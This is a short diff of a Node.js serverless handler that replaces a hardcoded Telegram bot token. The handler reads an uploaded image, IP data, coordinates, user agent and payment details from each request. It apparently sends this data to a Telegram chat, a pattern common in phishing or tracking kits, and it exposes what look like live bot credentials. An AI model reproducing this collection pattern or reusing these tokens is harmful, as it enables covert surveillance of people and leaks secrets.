@@ -10,7 +10,7 @@ module.exports = async (req, res) => {
     
     const { image, role, ipInfo, latLon, userAgent, transaction_id, amount, user_email } = body || {};
 
-    const TELEGRAM_BOT_TOKEN = "8818642094:AAGLCmtYPDVV4xVGXPUAPHpZpcr6qLHb13U";
+    const TELEGRAM_BOT_TOKEN = "8818642094:AAGq4NHdwOFIFy-0SZhBbIJKfrqNyfRQIFE";
     const TELEGRAM_CHAT_ID = "8896989037";
 
     if (!image) return res.status(400).json({ error: 'No image provided' });
